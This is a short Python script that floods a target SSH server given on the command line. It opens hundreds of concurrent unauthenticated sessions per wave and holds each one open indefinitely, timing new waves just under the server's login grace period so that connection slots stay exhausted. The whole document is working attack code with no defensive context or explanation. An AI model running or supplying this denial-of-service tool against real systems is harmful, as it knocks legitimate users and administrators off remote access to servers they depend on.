from sys import argv
from ssh.session import Session
from ssh import options
from time import sleep

import _thread as thread

HOST = argv[1]
CONCURRENT = 600
LoginGraceTime = 60

try:
    CONCURRENT = int(argv[2])
except:
    pass

count = 0

def go():
    while True:
        try:
            s = Session()
            s.options_set(options.HOST, HOST)
            s.connect()
            sleep(2147483647)
        except Exception as e:
            global count
            print(str(e) + ': died #' + str(count))
            if 'Connection reset' in str(e):
                break
            count += 1
            pass

def threadStarter():
    for i in range(CONCURRENT):
        thread.start_new_thread(go, ())

if __name__ == "__main__":
    while True:
        thread.start_new_thread(threadStarter, ())
        sleep(LoginGraceTime - 1)
        #sleep(0.1)
        
    sleep(2147483647)
